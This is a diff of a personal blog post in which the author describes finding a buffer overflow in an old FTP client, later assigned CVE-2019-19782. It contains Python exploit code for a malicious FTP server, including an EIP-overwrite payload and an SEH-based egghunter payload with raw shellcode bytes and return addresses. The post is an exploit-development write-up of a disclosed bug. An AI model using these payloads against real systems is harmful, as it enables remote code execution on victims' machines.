@@ -21,7 +21,7 @@ Studying to take the OSCE exam, i was simply fascinated by the Exploit dev topic
 Doing the exercises, i was able to successfuly exploit one of the examples. So, i thought "Yeah, it's time to find a really old software that i could run in a windows vista and try to find some AAAA shenanigans", and that's what i did, got first a windows xp and windows vista vm running and the AceaXe software bundle installed.
 &nbsp;
 
-First, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
+At first, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
 &nbsp;
 
 As i was researching i found a lot of PoCs of ftp clients that got exploited by sending the response of the ftp commands with the exploit code. so, after some hours of trying a lot of gui overflows and file sizes oveflows, I finnally tried creating my own fake FTP server in python and sending the famous EHLO response with a giant string &afterwords, and it worked, EIP was finnaly overwritten by the AAAAs ! 
@@ -50,17 +50,64 @@ while True:
 	    print ('[+] Envindo o payload')     
 	    conn.send(dadosenviados)
 	    conn.close()
-	    print ('[+] Chegou tua shell na porta 6666')
+	    print ('[+] Payload enviado com sucesso')
 	except:
 		print ('[-] Tivemos um prolema, veja se tudo foi settado corretamente')
+		
 {% endhighlight %}
 &nbsp;
 
-So, after Creating a FTP server I was able to send the malicious Buffer, to exploit this vulnerability. and after doind all the steps needed to create the simple buffer overflow i was able to retrieve a Command shell on the machine
+So, after Creating a FTP server I was able to send the malicious Buffer, to exploit this vulnerability. and after doing all the steps needed to create the simple buffer overflow i was able to retrieve a Command shell on the machine
+&nbsp;
+By sending the following payload, i was able to take control of the EIP 
+
+&nbsp;
+{% highlight python %}
+
+jmpesp = "\x96\x72\x01\x68"
+lixo = "\x41"*2061
+nopsled = "\x90"*20
+eip = '\x6F\x4A\x08\x68'
+
+payload = lixo+eip+jmpesp+nopsled+shellcode+nopsled     
+
+dadosenviados = '220'+payload+'\r\n'
+
+{% endhighlight %}
+&nbsp;
+
+So, nothing new there, just a classic default buffer overflow, but i was so happy that i have found it haha. It was time to exploit it in windows vista, to smack some windows ASLRs. 
+
+I exploited it using a SEH based Buffer overflow, and by using the egghunter technique.
+
+
+&nbsp;
+{% highlight python %}
+
+
+lixo1 = "\x41"*100
+lixo2 = "D" * (9266-len(shellcode))
+lixo3 = "C" * 576
+nopsled = "\x90"*20
+
+
+egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+egg = "w00tw00t"
+
+nseh = "\x90\x90\xEB\x05" 
+seh = "\xF8\x54\x01\x68" #POP POP RET 680154F8 in WCMDPA10.DLL
+
+payload = lixo1 + egg + nopsled + shellcode + lixo2 + nseh + seh + egghunter + lixo3
+
+
+dadosenviados = '220'+payload+'\r\n'
+
+{% endhighlight %}
 &nbsp;
 
 #CVE
 
-Coming soon
-
+CVE-2019-19782
 
